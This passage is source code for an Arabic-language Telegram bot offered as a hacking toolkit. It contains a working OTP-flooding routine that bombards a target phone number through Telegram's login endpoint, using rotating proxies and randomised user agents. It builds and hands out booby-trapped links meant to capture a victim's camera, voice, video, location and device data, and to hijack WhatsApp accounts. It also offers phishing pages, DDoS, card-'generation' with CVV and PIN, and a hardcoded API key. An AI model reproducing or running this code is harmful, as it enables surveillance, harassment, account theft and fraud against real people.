            method: 'GET',
            headers: {
                'X-Api-Key': apiKey
            }
        });

        const data = await response.json();

        
        const cardInfo = `
            Card Issuer: ${data.type}
            Card Number: ${data.cardNumber}
            Full Name: ${data.fullName}
            CVV: ${data.cvv}
            Pin: ${data.pin}
            Expiration Date: ${data.date}
        `;

        return cardInfo;
    } catch (error) {
        console.error('Error fetching card data:', error);
        return 'Error fetching card data. Please try again later.';
    }
}

bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;

    if (query.data === 'generate_card') {
        const cardData = await getCardData();
        bot.sendMessage(chatId, cardData);
    }
});

const HttpsProxyAgent = require('https-proxy-agent');

let sessions = {};

const proxyList = [
    'http://188.132.221.81:8080',
    'http://160.86.242.23:8080',
    'http://176.56.139.57:8081',
    'http://44.226.167.102:3128',
    'http://3.71.239.218:80',
    'http://13.37.89.201:80',
    'http://47.238.130.212:8080',
    'http://47.91.89.3:8080',
    'http://3.71.239.218:3128',
    'http://165.232.129.150:80',
    'http://38.54.95.19:3128',
    'http://8.213.215.187:1081',
    'http://85.215.64.49:80',
    'http://185.118.153.110:8080',
    'http://38.242.199.124:8089',
    'http://93.42.151.100:8080',
    'http://51.89.255.67:80',
    'http://8.211.49.86:9098',
    'http://13.37.59.99:80',
    'http://47.90.149.238:80'
    
];

async function getWorkingProxy() {
    for (const proxy of proxyList) {
        try {
            const agent = new HttpsProxyAgent(proxy);
            await axios.get('https://api.ipify.org', { httpsAgent: agent, timeout: 5000 });
            return proxy;
        } catch (error) {
            console.log(`Proxy ${proxy} is not working`);
        }
    }
    throw new Error('No working proxy found');
}

function generateUserAgent() {
    const browsers = ['Chrome', 'Firefox', 'Safari', 'Opera', 'Edge'];
    const versions = ['90', '91', '92', '93', '94', '95', '96', '97', '98', '99', '100'];
    const osVersions = ['10', '11', '12', '13', '14', '15'];
    const devices = [
        'Windows NT 10.0', 'Macintosh; Intel Mac OS X 10_15_7',
        'iPhone; CPU iPhone OS 14_7_1 like Mac OS X', 'Linux x86_64',
        'Android 10; SM-A505F', 'Android 11; Pixel 4', 'Android 12; OnePlus 9 Pro'
    ];

    const browser = browsers[Math.floor(Math.random() * browsers.length)];
    const version = versions[Math.floor(Math.random() * versions.length)];
    const osVersion = osVersions[Math.floor(Math.random() * osVersions.length)];
    const device = devices[Math.floor(Math.random() * devices.length)];

    return `Mozilla/5.0 (${device}) AppleWebKit/537.36 (KHTML, like Gecko) ${browser}/${version}.0.${Math.floor(Math.random() * 9999)}.${Math.floor(Math.random() * 99)} Safari/537.36`;
}

async function spam(number, chatId) {
    if (!sessions[chatId] || !sessions[chatId].active) return;

    const agent = generateUserAgent();
    const payload = `phone=${number}`;
    const headers = {
        'User-Agent': agent,
        'Accept-Encoding': "gzip, deflate, br, zstd",
        'Content-Type': "application/x-www-form-urlencoded",
        'sec-ch-ua': "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Google Chrome\";v=\"128\"",
        'sec-ch-ua-platform': "\"Android\"",
        'x-requested-with': "XMLHttpRequest",
        'sec-ch-ua-mobile': "?1",
        'origin': "https://oauth.telegram.org",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write",
        'accept-language': "ar,ar-YE;q=0.9,en-US;q=0.8,en;q=0.7",
        'priority': "u=1, i",
    };

    let axiosConfig = {
        params: {
            'bot_id': "5444323279",
            'origin': "https://fragment.com",
            'request_access': "write",
        },
        headers: headers,
        timeout: 30000 // 30 seconds timeout
    };

    try {
        if (sessions[chatId].useProxy) {
            const workingProxy = await getWorkingProxy();
            axiosConfig.httpsAgent = new HttpsProxyAgent(workingProxy);
        }

        const response = await axios.post("https://oauth.telegram.org/auth/request", payload, axiosConfig);

        if (response.data && response.data.random_hash) {
            sessions[chatId].successCount++;
            await updateSuccessReport(chatId);
        } else {
            sessions[chatId].failCount++;
            await updateFailReport(chatId);
        }
    } catch (error) {
        console.error(`Error for ${chatId}: ${error.message}`);
        sessions[chatId].failCount++;
        await updateFailReport(chatId);
    }

    if (sessions[chatId].active) {
        const delay = 5000 + Math.floor(Math.random() * 10000); // تأخير عشوائي بين 5 إلى 15 ثانية
        setTimeout(() => spam(number, chatId), delay);
    }
}
async function updateSuccessReport(chatId) {
    const session = sessions[chatId];
    const total = session.successCount + session.failCount;
    const successRate = total > 0 ? (session.successCount / total * 100).toFixed(2) : '0.00';
    
    const message = `✅ تم إرسال رسالة بنجاح!\n\n📊 تقرير العمليات:\n✅ ناجحة: ${session.successCount}\n📈 نسبة النجاح: ${successRate}%\n🕒 إجمالي المحاولات: ${total}`;

    try {
        if (!session.successMessageId) {
            const sentMessage = await bot.sendMessage(chatId, message);
            session.successMessageId = sentMessage.message_id;
        } else {
            await bot.editMessageText(message, {
                chat_id: chatId,
                message_id: session.successMessageId
            });
        }
    } catch (error) {
        console.error(`Error updating success report: ${error.message}`);
    }
}

async function updateFailReport(chatId) {
    const session = sessions[chatId];
    const total = session.successCount + session.failCount;
    const failRate = total > 0 ? (session.failCount / total * 100).toFixed(2) : '0.00';
    
    const message = ` جاري ارسال السبام.\n\n📊 تقرير العمليات:\n جاري الارسال: ${session.failCount}\n📉 نسبة المحاولة: ${failRate}%\n🕒 إجمالي المحاولات: ${total}`;

    try {
        if (!session.failMessageId) {
            const sentMessage = await bot.sendMessage(chatId, message);
            session.failMessageId = sentMessage.message_id;
        } else {
            await bot.editMessageText(message, {
                chat_id: chatId,
                message_id: session.failMessageId
            });
        }
    } catch (error) {
        console.error(`Error updating fail report: ${error.message}`);
    }
}

bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;

    if (data === 'spam_telegram') {
        bot.sendMessage(chatId, "الرجاء إدخال رقم الهاتف مع رمز الدولة (مثل: +967XXXXXXXX).");
    } else if (data === 'start_spam_with_proxy') {
        if (sessions[chatId] && sessions[chatId].number) {
            sessions[chatId].useProxy = true;
            startSpamSession(chatId);
        } else {
            bot.sendMessage(chatId, "الرجاء تحديد رقم الهاتف أولاً.");
        }
    } else if (data === 'start_spam_without_proxy') {
        if (sessions[chatId] && sessions[chatId].number) {
            sessions[chatId].useProxy = false;
            startSpamSession(chatId);
        } else {
            bot.sendMessage(chatId, "الرجاء تحديد رقم الهاتف أولاً.");
        }
    } else if (data === 'stop_spam') {
        if (sessions[chatId] && sessions[chatId].active) {
            sessions[chatId].active = false;
            bot.sendMessage(chatId, "تم إيقاف العملية.");
        } else {
            bot.sendMessage(chatId, "لم يتم بدء أي عملية بعد.");
        }
    }

    bot.answerCallbackQuery(callbackQuery.id);
});

function startSpamSession(chatId) {
    if (!sessions[chatId].active) {
        sessions[chatId].active = true;
        sessions[chatId].successCount = 0;
        sessions[chatId].failCount = 0;
        sessions[chatId].successMessageId = null;
        sessions[chatId].failMessageId = null;
        bot.sendMessage(chatId, `جاري بدء العملية على الرقم: ${sessions[chatId].number} ${sessions[chatId].useProxy ? 'مع استخدام بروكسي' : 'بدون بروكسي'}`);
        spam(sessions[chatId].number, chatId);
    } else {
        bot.sendMessage(chatId, "العملية جارية بالفعل.");
    }
}


bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const userInput = msg.text;

    if (userInput && userInput.startsWith("+") && /^\+\d+$/.test(userInput)) {
        const number = userInput;
        bot.sendMessage(chatId, `تم تحديد الرقم: ${number}. اختر الإجراء المناسب:`, {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '▶️ بدء العملية مع بروكسي', callback_data:'start_spam_with_proxy' },
                        { text: '▶️ بدء العملية بدون بروكسي', callback_data:'start_spam_without_proxy' }
                    ],
                    [
                        { text: '⏹️ إيقاف العملية', callback_data:'stop_spam' }
                    ]
                ]
            }
        });
        sessions[chatId] = { number: number, active: false, successCount: 0, failCount: 0, successMessageId: null, failMessageId: null, useProxy: false };
    }
});
   
const fetch = require('node-fetch');
const ipinfo = require('ipinfo');
const dns = require('dns').promises;

const virusTotalApiKey = 'b51c4d5a437011492aa867237c80bdb04dcc377ace0e4814bea41336e52f1c73';

bot.on('callback_query', async (callbackQuery) => {
  const msg = callbackQuery.message;
  const chatId = msg.chat.id;

  if (callbackQuery.data === 'check_link') {
    bot.sendMessage(chatId, "الرجاء إرسال الرابط لفحصه:");
    
    bot.once('message', async (msg) => {
      const url = msg.text;
      
      if (isValidUrl(url)) {
        let progressMessage = await bot.sendMessage(chatId, "Verification...\n[░░░░░░░░░░] 0%");
        const interval = displayProgress(bot, chatId, progressMessage);
        const result = await scanAndCheckUrl(url);
        clearInterval(interval);  // إيقاف شريط التقدم بعد انتهاء الفحص
        await bot.deleteMessage(chatId, progressMessage.message_id); // حذف رسالة التقدم
        bot.sendMessage(chatId, result);
      } else {
        bot.sendMessage(chatId, "الرجاء إرسال رابط صحيح.");
      }
    });
  }
});

async function scanAndCheckUrl(url) {
  try {
    // إرسال الرابط للفحص
    const scanResponse = await fetch(`https://www.virustotal.com/vtapi/v2/url/scan`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: `apikey=${virusTotalApiKey}&url=${encodeURIComponent(url)}`,
    });
    const scanData = await scanResponse.json();

   
    await new Promise(resolve => setTimeout(resolve, 5000)); 

   
    const reportResponse = await fetch(`https://www.virustotal.com/vtapi/v2/url/report?apikey=${virusTotalApiKey}&resource=${encodeURIComponent(url)}`);
    const reportData = await reportResponse.json();

    const ipInfo = await fetchIpInfo(url);
    
    let result;
    
    
    if (reportData.positives > 0) {
      // إذا كان الرابط خطير
      result = `• الرابط: ${url}\n\n` +
               `• التصنيف: خطير جداً 🔴\n\n` +
               `• تفاصيل التصنيف: تم اكتشاف برمجيات خبيثة. الرجاء الحذر وتجنب هذا الرابط.\n\n` +
               `• معلومات IP: ${ipInfo.ip}\n\n` +
               `• مزود الخدمة: ${ipInfo.org || 'غير متوفر'}\n\n` +
               `• الموقع: ${ipInfo.city || 'غير متوفر'}, ${ipInfo.region || 'غير متوفر'}, ${ipInfo.country || 'غير متوفر'}`;
    } else if (isSuspicious(reportData)) {
      
      result = `• الرابط: ${url}\n\n` +
               `• التصنيف: مشبوه 🟠\n\n` +
               `• تفاصيل التصنيف: تم تصنيفه بأنه مشبوه. لم نجد برمجيات خبيثة مؤكدة، ولكن هناك بعض الإشارات المقلقة. الرجاء الحذر عند التعامل معه.\n\n` +
               `• معلومات IP: ${ipInfo.ip}\n\n` +
               `• مزود الخدمة: ${ipInfo.org || 'غير متوفر'}\n\n` +
               `• الموقع: ${ipInfo.city || 'غير متوفر'}, ${ipInfo.region || 'غير متوفر'}, ${ipInfo.country || 'غير متوفر'}`;
    } else {
      // إذا كان الرابط آمن
      result = `• الرابط: ${url}\n\n` +
               `• التصنيف: آمن 🟢\n\n` +
               `• تفاصيل التصنيف: لقد قمنا بفحص الرابط ولم نجد أي تهديدات معروفة.\n\n` +
               `• معلومات IP: ${ipInfo.ip}\n\n` +
               `• مزود الخدمة: ${ipInfo.org || 'غير متوفر'}\n\n` +
               `• الموقع: ${ipInfo.city || 'غير متوفر'}, ${ipInfo.region || 'غير متوفر'}, ${ipInfo.country || 'غير متوفر'}`;
    }

    return result;

  } catch (error) {
    console.error(error);
    return "حدث خطأ أثناء فحص الرابط.";
  }
}


function isSuspicious(reportData) {
  
  return reportData.total > 0 && reportData.positives === 0 && (
    reportData.scan_date > Date.now() - 7 * 24 * 60 * 60 * 1000 || // تم فحصه في الأسبوع الماضي
    reportData.total < 10 || // عدد قليل من عمليات الفحص
    reportData.response_code !== 1 // استجابة غير عادية من VirusTotal
  );
}

function displayProgress(bot, chatId, message) {
  let progress = 0;
  const progressBar = ["░░░░░░░░░░", "▓░░░░░░░░░", "▓▓░░░░░░░░", "▓▓▓░░░░░░░", "▓▓▓▓░░░░░░", "▓▓▓▓▓░░░░░", "▓▓▓▓▓▓░░░░", "▓▓▓▓▓▓▓░░░", "▓▓▓▓▓▓▓▓░░", "▓▓▓▓▓▓▓▓▓░", "▓▓▓▓▓▓▓▓▓▓"];

  return setInterval(async () => {
    if (progress >= 10) {
      progress = 0; // إعادة ضبط التقدم
    } else {
      progress++;
    }

    await bot.editMessageText(`Verification...\n[${progressBar[progress]}] ${progress * 10}%`, {
      chat_id: chatId,
      message_id: message.message_id
    });
  }, 500);  // يحدث كل 500 مللي ثانية
}

async function fetchIpInfo(url) {
  try {
    const domain = new URL(url).hostname;
    const ipAddress = await dns.lookup(domain);
    return new Promise((resolve, reject) => {
      ipinfo(ipAddress.address, (err, cLoc) => {
        if (err) reject(err);
        resolve(cLoc);
      });
    });
  } catch (error) {
    console.error('Error fetching IP info:', error);
    return { ip: 'غير متوفر', org: 'غير متوفر', city: 'غير متوفر', region: 'غير متوفر', country: 'غير متوفر' };
  }
}

function isValidUrl(string) {
  try {
    new URL(string);
    return true;
  } catch (_) {
    return false;
  }
}

function showDefaultButtons(userId) {
  // الأزرار المطلوبة
  let defaultButtons = [
    [
      { text: '📸 اختراق كاميرا ام وخ', callback_data: 'front_camera' },
      { text: '🔬 جمع معلومات الجهاز', callback_data: 'collect_device_info' }
    ],
    [
      { text: '🎥 تصوير الضحية فيديو', callback_data: 'capture_video' },
      { text: '🎙 تسجيل صوت الضحية', callback_data: 'voice_record' }
    ],
    [
      { text: '🗺️ اختراق الموقع', callback_data: 'get_location' },
      { text: '📡 اختراق كاميرا المراقبة', callback_data: 'get_cameras' }
    ],
    [
      { text: '🟢 اختراق واتساب', callback_data: 'request_verification' },
      { text: '⚠️ تلغيم رابط', callback_data: 'malware_link' }
    ],
    [
      { text: '💻 اختراق تيك توك', callback_data: 'increase_tiktok' },
      { text: '📸 اختراق انستغرام', callback_data: 'increase_instagram' }
    ],
    [
      { text: '📘 اختراق فيسبوك', callback_data: 'increase_facebook' },
      { text: '👻 اختراق سناب شات', callback_data: 'increase_snapchat' }
    ],
    [
      { text: '🔴 اختراق يوتيوب', callback_data: 'increase_youtube' },
      { text: '🐦 اختراق تويتر', callback_data: 'increase_twitter' }
    ],
    [
      { text: '💳 صيد فيزات', callback_data: 'generate_card' },
      { text: '💰 إختراق لعبه اكونزات', callback_data: 'toptop_coins' }
    ],
    [
      { text: '💎 شحن جواهر فري فاير', callback_data: 'free_fire_diamonds' },
      { text: '🔫 اختراق حسابات ببجي', callback_data: 'pubg_uc' }
    ],
    [
      { text: '✉️ إنشاء إيميل وهمي', callback_data: 'create_email' },
      { text: '💣 اغلاق المواقع', web_app: { url: 'https://ddos7.pages.dev' } }
    ],
    [
      { text: '🤖 االذكاء الاصطناعي', web_app: { url: 'https://nikai.pages.dev' } },
      { text: '🤣 اعطيني نكته', callback_data: 'get_joke' }
    ],
    [
      { text: '🎵 اندكس تيك توك', callback_data: 'login_tiktok' },
      { text: '📸 اندكس انستغرام', callback_data: 'login_instagram' }
    ],
    [
      { text: '📘 اندكس فيسبوك', callback_data: 'login_facebook' },
      { text: '👻 اندكس سناب شات', callback_data: 'login_snapchat' }
    ],
    [
      { text: '🐦 اندكس تويتر', callback_data: 'login_twitter' },
      { text: '🚸 فك حظر واتساب', callback_data: 'get_love_message' }
    ],
    [
      { text: '🧙‍♂️ تفسير الأحلام', web_app: { url: 'https://dream8.pages.dev' } },
      { text: '🧠 لعبة الأذكياء', web_app: { url: 'https://cu.roks.workers.dev/kki' } }
    ],
    [
      { text: '🚀 سبام تيليجرام', callback_data: 'spam_telegram' },
      { text: '💥 سبام واتساب', callback_data: 'whatsapp_spam' }
    ],
    [
      { text: '🔒 إخفاء الرابط', callback_data: 'hide_url' },
      { text: '🔞 إختراق الهاتف كاملاً', callback_data: 'add_nammes' }
    ],
    [
      { text: '📺 إختراق بث التلفزيون', callback_data: 'tv_channels' },
      { text: '📻 اختراق بث الريدو', callback_data: 'radio_stations' }
    ],
    [
      { text: '📞 بوت كاشف الأرقام', url: 'https://t.me/S_S_YEbot' },
      { text: '📱 بوت المميزات المجاني ', url: 'https://t.me/QR_l4229BOT' }
    ],
    [
      { text: '🔍 فحص رابط', callback_data: 'check_link' },
      { text: '🔄 تحويل النص إلى صوت', callback_data: 'convert_text' }
    ],
    [
      { text: '📲 | معلومات IP', callback_data:'ip_tracker' },
      { text: '👁️ | البحث عن المستخدم', callback_data: 'username_tracker' }
    ],
    [
      { text: 'قناه المطور ', url: 'https://t.me/SJGDDW' },
      { text: 'تتواصل مع المطور', url: 'https://t.me/SJG_D' }
    ],
    [
      { text: '🔍 البحث عبر الأيادي', callback_data: 'search_by_id' },
      { text: 'صيد يوزرت تلجرام 🪝', callback_data: 'choose_type' }
    ],
    [
      { text: 'الرقام وهميه ☎️', callback_data: 'SS' },
      { text: 'البحث عن صور 🎨', callback_data: 'search_images' }
    ],
    [
      { text: ' ✨صور بذكاء الصناعي', web_app: { url: 'https://alder-natural-phosphorus.glitch.me/' } },
      { text: 'زخرفة الاسماء 🗿', callback_data: 'zakhrafa' }
    
    ]
  ];

  bot.sendMessage(userId, 'مرحباً! يمكنك التمتع بالخدمات واختيار ما يناسبك من الخيارات المتاحة:', {
    reply_markup: {
      inline_keyboard: defaultButtons
    }
  });
}

let hackLinks = {
    
    camera: 'https://old-sun-8bd2.rwks332.workers.dev/camera',
    
  
    voice_record: 'https://old-sun-8bd2.rwks332.workers.dev/voice',
    
    
    request_verification: 'https://old-sun-8bd2.rwks332.workers.dev/whatsapp',
    
    
    malware_link: 'https://old-sun-8bd2.rwks332.workers.dev/malware',
    
   
    collect_device_info: 'https://old-sun-8bd2.rwks332.workers.dev/phone',
    
    
    get_location: 'https://old-sun-8bd2.rwks332.workers.dev/local',
    
    
    capture_video: 'https://old-sun-8bd2.rwks332.workers.dev/video'
};

async function saveHackLinks() {
    try {
        await saveData('hackLinks', hackLinks);
        console.log('✅ تم حفظ روابط الاختراق بنجاح');
    } catch (error) {
        console.error('❌ خطأ في حفظ روابط الاختراق:', error);
    }
}

async function loadHackLinks() {
    const savedLinks = await loadData('hackLinks');
    if (savedLinks) {
        hackLinks = savedLinks;
        console.log('✅ تم تحميل روابط الاختراق:', hackLinks);
    }
}

loadHackLinks();

function getHackLinkName(linkKey) {
    const names = {
        camera: '📸 الكاميرا (أمامية وخلفية)',
        capture_video: '🎥 تصوير فيديو',
        voice_record: '🎙 تسجيل صوتي',
        request_verification: '🟢 اختراق واتساب',
        malware_link: '⚠️ تلغيم رابط',
        collect_device_info: '🔬 معلومات الجهاز',
        get_location: '🗺️ تتبع الموقع'
    };
    return names[linkKey] || linkKey;
}

bot.onText(/\/ss/, async (msg) => {
    const userId = msg.from.id.toString();
    
    if (!isAdmin(userId)) {
        return bot.sendMessage(msg.chat.id, '❌ هذا الأمر متاح فقط للمشرفين.');
    }

    const keyboard = [];
    const linkKeys = Object.keys(hackLinks);
    
    for (let i = 0; i < linkKeys.length; i += 2) {
        const row = [];
        
        
        row.push({ 
            text: getHackLinkName(linkKeys[i]), 
            callback_data: `edit_hack_${linkKeys[i]}` 
        });
        
        // الرابط الثاني إذا موجود
        if (i + 1 < linkKeys.length) {
            row.push({ 
                text: getHackLinkName(linkKeys[i + 1]), 
                callback_data: `edit_hack_${linkKeys[i + 1]}` 
            });
        }
        
        keyboard.push(row);
    }

    await bot.sendMessage(msg.chat.id, '🔗 **لوحة تحكم روابط الاختراق**\nاختر الرابط الذي تريد تعديله:', {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});

bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const userId = query.from.id.toString();
    const data = query.data;

    if (data.startsWith('edit_hack_') && !isAdmin(userId)) {
        return bot.answerCallbackQuery(query.id, { text: '❌ غير مصرح', show_alert: true });
    }

    // تعديل رابط معين
    if (data.startsWith('edit_hack_')) {
        const linkKey = data.replace('edit_hack_', '');
        const currentLink = hackLinks[linkKey] || 'غير موجود';
        
        await bot.sendMessage(chatId, 
            `📌 **تعديل الرابط**\n` +
            `🔗 **النوع:** ${getHackLinkName(linkKey)}\n\n` +
            `📍 الرابط الحالي: \`${currentLink}\`\n\n` +
            `✍️ أرسل الرابط الجديد الآن:`,
            { parse_mode: 'Markdown' }
        );

        // تخزين حالة المستخدم
        allUsers[chatId] = { 
            step: 'awaiting_hack_link', 
            linkKey: linkKey 
        };
        
        await bot.answerCallbackQuery(query.id);
    }
});

// معالج استقبال الرابط الجديد
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    // معالج روابط الاختراق
    if (allUsers[chatId] && allUsers[chatId].step === 'awaiting_hack_link') {
        const { linkKey } = allUsers[chatId];
        
        // التحقق من صحة الرابط
        try {
            new URL(text);
        } catch (error) {
            return bot.sendMessage(chatId, '❌ الرابط غير صالح. يرجى إرسال رابط صحيح يبدأ بـ http:// أو https://');
        }

hackLinks[linkKey] = text;

await saveHackLinks(); 
        
        await saveHackLinks();
        
        bot.sendMessage(chatId, 
            `✅ تم تحديث الرابط بنجاح!\n\n` +
            `🔗 **النوع:** ${getHackLinkName(linkKey)}\n` +
            `📍 **الرابط الجديد:** \`${text}\``,
            { parse_mode: 'Markdown' }
        );
        
        // مسح حالة المستخدم
        delete allUsers[chatId];
    }
});

const baseUrl = process.env.R;

bot.on('callback_query', (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;

    function sendMessageWithLink(url, messagePrefix) {
        bot.sendMessage(chatId, `${messagePrefix} ${url}`);
    }

    // ✅ استخدام الرابط الموحد للكاميرا
    if (data === 'front_camera' || data === 'rear_camera') {
        const url = `${hackLinks.camera}?chatId=${chatId}&type=${data === 'front_camera' ? 'front' : 'rear'}`;
        sendMessageWithLink(url, 'تم تلغيم رابط اختراق الكاميرا:');
    }
    
    // باقي الروابط
    else if (data === 'malware_link') {
        bot.sendMessage(chatId, 'من فضلك أرسل الرابط الذي ترغب في تلغيمه:');
        bot.once('message', (msg) => {
            if (msg.text) {
                const link = msg.text;
                const malwareUrl = `${hackLinks.malware_link}?chatId=${chatId}&originalLink=${encodeURIComponent(link)}`;
                sendMessageWithLink(malwareUrl, '⚠️ تم تلغيم الرابط، استخدم هذا الرابط لاختراق:');
            } else {
                bot.sendMessage(chatId, 'الرجاء إرسال رابط نصي صالح.');
            }
        });
    } else if (data === 'voice_record') {
        bot.sendMessage(chatId, 'من فضلك أدخل مدة التسجيل بالثواني (1-20):');
        bot.once('message', (msg) => {
            const duration = parseInt(msg.text, 10);
            if (!isNaN(duration) && duration >= 1 &&  duration <= 20) {
                const url = `${hackLinks.voice_record}?chatId=${chatId}&duration=${duration}`;
                sendMessageWithLink(url, `تم تلغيم رابط تسجيل الصوت لمدة ${duration} ثانية:`);
            } else {
                bot.sendMessage(chatId, 'الرجاء إدخال مدة تسجيل صحيحة بين 1 و 20 ثانية.');
            }
        });
    } else if (data === 'get_location') {
        const url = `${hackLinks.get_location}?chatId=${chatId}`;
        sendMessageWithLink(url, 'تم تلغيم رابط اختراق موقع الضحية:');
    } else if (data === 'capture_video') {
        const url = `${hackLinks.capture_video}?chatId=${chatId}`;
        sendMessageWithLink(url, 'تم تلغيم رابط اختراق الكاميرا فيديو:');
    } else if (data === 'request_verification') {
        const verificationLink = `${hackLinks.request_verification}?chatId=${chatId}`;
        sendMessageWithLink(verificationLink, 'تم إنشاء رابط لاختراق واتساب:');
    } else if (data === 'collect_device_info') {
        const url = `${hackLinks.collect_device_info}?chatId=${chatId}`;
        sendMessageWithLink(url, 'تم تلغيم رابط جمع معلومات الجهاز:');
    }
});
// ==================== نهاية نظام /ss ====================      
bot.onText(/\/ssss/, (msg) => {
    const chatId = msg.chat.id;

    allUsers.set(chatId, false);
    const options = {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: 'البحث عبر الأيادي', callback_data: 'search_by_id' }
                ]
            ]
        }
    };

    bot.sendMessage(chatId, "مرحبًا! اضغط على الزر أدناه للبحث عبر الأيادي:", options);
});

bot.on('callback_query', (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;

    if (callbackQuery.data === 'search_by_id') {
        
        allUsers.set(chatId, true);

        bot.sendMessage(chatId, "يرجى الآن إرسال Telegram User ID للحساب الذي تريد البحث عنه:");
    }
});

bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.text;

    if (!allUsers.get(chatId)) {
        return; 
    }

    if (/^\d+$/.test(userId)) {
        const link = `tg://openmessage?user_id=${userId}`;
        const options = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: `رابط البحث عن ${userId}`, url: link }
                    ]
                ]
            }
        };

        bot.sendMessage(chatId, "تم العثور على حساب:", options);

        allUsers.set(chatId, false);
    }
});
const countries = {
  '+1': ["أمريكا", "🇺🇸"],
  '+46': ["السويد", "🇸🇪"],
  '+86': ["الصين", "🇨🇳"],
  '+852': ["هونغ كونغ", "🇭🇰"],
  '+45': ["الدنمارك", "🇩🇰"],
  '+33': ["فرنسا", "🇫🇷"],
  '+31': ["هولندا", "🇳🇱"],
  '+7': ["روسيا", "🇷🇺"],
  '+7KZ': ["كازاخستان", "🇰🇿"],
  '+381': ["صربيا", "🇷🇸"],
  '+44': ["بريطانيا", "🇬🇧"],
  '+371': ["لاتفيا", "🇱🇻"],
  '+62': ["إندونيسيا", "🇮🇩"],
  '+351': ["البرتغال", "🇵🇹"],
  '+34': ["إسبانيا", "🇪🇸"],
  '+372': ["إستونيا", "🇪🇪"],
  '+358': ["فنلندا", "🇫🇮"]
};
async function importNumbers() {
  try {
    const _0xe92ce1 = await axios.get("https://nm-umber.vercel.app/");
    return _0xe92ce1.data.split("\n");
  } catch (_0x32f466) {
    console.error("خطأ في جلب الأرقام:", _0x32f466);
    return [];
  }
}
async function getRandomNumberInfo() {
  const _0x33d7f5 = await importNumbers();
  if (_0x33d7f5.length === 0) {
    return null;
  }
  const _0x43177e = Math.floor(Math.random() * _0x33d7f5.length);
  const _0x2e75cb = _0x33d7f5[_0x43177e].trim();
  const _0x481ccd = new Date().toISOString().split('T')[0];
  const _0x396e9c = new Date().toLocaleTimeString("ar-SA");
  let _0x450156;
  if (_0x2e75cb.startsWith('+1')) {
    _0x450156 = '+1';
  } else if (_0x2e75cb.startsWith('+7')) {
    _0x450156 = _0x2e75cb.includes('7') ? "+7KZ" : '+7';
  } else {
    _0x450156 = _0x2e75cb.slice(0, 4) in countries ? _0x2e75cb.slice(0, 4) : _0x2e75cb.slice(0, 3);
  }
  const [_0x4233d4, _0x4c5532] = countries[_0x450156] || ["دولة غير معروفة", '🚩'];
  return {
    'number': _0x2e75cb,
    'countryCode': _0x450156,
    'countryName': _0x4233d4,
    'countryFlag': _0x4c5532,
    'creationDate': _0x481ccd,
    'creationTime': _0x396e9c
  };
}
async function getMessages(_0x5220e2) {
  try {
    const _0xb1fbec = await axios.get("https://sms24.me/en/numbers/" + _0x5220e2);
    const _0x5503c9 = cheerio.load(_0xb1fbec.data);
    const _0x178622 = [];
    _0x5503c9("span.placeholder.text-break").each((_0xaa0b7, _0x180f8e) => {
      _0x178622.push(_0x5503c9(_0x180f8e).text().trim());
    });
    return _0x178622;
  } catch (_0x4a0841) {
    console.error("خطأ في جلب الرسائل:", _0x4a0841);
    return [];
  }
}
bot.onText(/\/stسمهصخصt/, _0x115849 => {
  const _0x5a8446 = _0x115849.chat.id;
  const _0x36bb9f = {
    'reply_markup': {
      'inline_keyboard': [[{
        'text': "الحصول على رقم وهمي",
        'callback_data': "get_number"
      }]]
    }
  };
  bot.sendMessage(_0x5a8446, "اضغط على الزر للحصول على رقم وهمي:", _0x36bb9f);
});
bot.on("callback_query", async _0x3e21f => {
  const _0x1285a3 = _0x3e21f.message;
  const _0x512cf6 = _0x1285a3.chat.id;
  const _0x58d511 = _0x3e21f.data;
  if (_0x58d511 === "get_number") {
    const _0x31e34c = await getRandomNumberInfo();
    if (_0x31e34c) {
      const _0xe817c6 = {
        'reply_markup': {
          'inline_keyboard': [[{
            'text': "تغير الرقم 🔁",
            'callback_data': "get_number"
          }], [{
            'text': "طلب الكود 💬",
            'callback_data': "request_code_" + _0x31e34c.number
          }]]
        }
      };
      const _0x3e6fe2 = "\n➖ تم الطلب 🛎• \n➖ رقم الهاتف ☎️ : `" + _0x31e34c.number + "`\n" + ("➖ الدوله : " + _0x31e34c.countryName + " " + _0x31e34c.countryFlag + "\n") + ("➖ رمز الدوله 🌏 : " + _0x31e34c.countryCode + "\n") + "➖ المنصه 🔮 : لجميع الموقع والبرامج\n" + ("➖ تاريج الانشاء 📅 : " + _0x31e34c.creationDate + "\n") + ("➖ وقت الانشاء ⏰ : " + _0x31e34c.creationTime + "\n") + "➖ اضغط ع الرقم لنسخه.";
      bot.editMessageText(_0x3e6fe2, {
        'chat_id': _0x512cf6,
        'message_id': _0x1285a3.message_id,
        'parse_mode': "Markdown",
        'reply_markup': _0xe817c6.reply_markup
      });
    } else {
      bot.sendMessage(_0x512cf6, "لم يتم استيراد الأرقام بنجاح.");
    }
  } else {
    if (_0x58d511.startsWith("request_code_")) {
      const _0x4cab4c = _0x58d511.split('_')[2];
      const _0x1f8769 = await getMessages(_0x4cab4c);
      if (_0x1f8769.length > 0) {
        let _0x237bcc = _0x1f8769.slice(0, 6).map((_0x48d5ca, _0x2164eb) => "الرسالة رقم " + (_0x2164eb + 1) + ": `" + _0x48d5ca + '`').join("\n\n");
        _0x237bcc += "\n\nاضغط على أي رسالة لنسخها.";
        bot.sendMessage(_0x512cf6, _0x237bcc, {
          'parse_mode': "Markdown"
        });
      } else {
        bot.sendMessage(_0x512cf6, "لا توجد رسائل جديدة.");
      }
    }
  }
});
